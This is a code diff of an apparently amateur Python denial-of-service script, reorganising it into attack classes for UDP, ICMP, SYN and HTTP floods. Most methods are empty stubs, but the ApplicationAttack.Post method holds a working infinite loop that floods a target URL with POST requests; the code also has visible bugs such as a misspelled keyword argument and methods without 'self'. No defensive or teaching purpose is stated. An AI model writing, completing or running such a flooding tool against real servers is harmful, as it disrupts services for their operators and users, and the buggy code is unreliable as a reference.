@@ -1,5 +1,6 @@
 import requests as res
 import multiprocessing
+import time
 
 choices = [1, 2, 3]
 
@@ -17,13 +18,32 @@ if attack_type == choices[1]:
 if attack_type == choices[2]:
     print(attack_type)
 
-def http():
-    while True:
-        for i in vector:
-            response = res.post(vector, data=bye, jason=None)
-            print(response.text)
-            
-print("using post method to: ", vector)
+class VolumeAttack:
+    def udp_flooding():
+        pass
+    
+    def ICMP():
+        pass
+
+class ProtocolAttack:
+    def Syn_flood():
+        pass
+    
+    def pof():
+        pass
+        
+class ApplicationAttack:
+    def Post():
+        print("using post method to: ", vector)
+        print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
+        time.sleep(10)
+        while True:
+            for i in vector:
+                response = res.post(vector, data=bye, jason=None)
+                print(response.text)
+
+    def Get():
+        pass
 
 processes = []
 
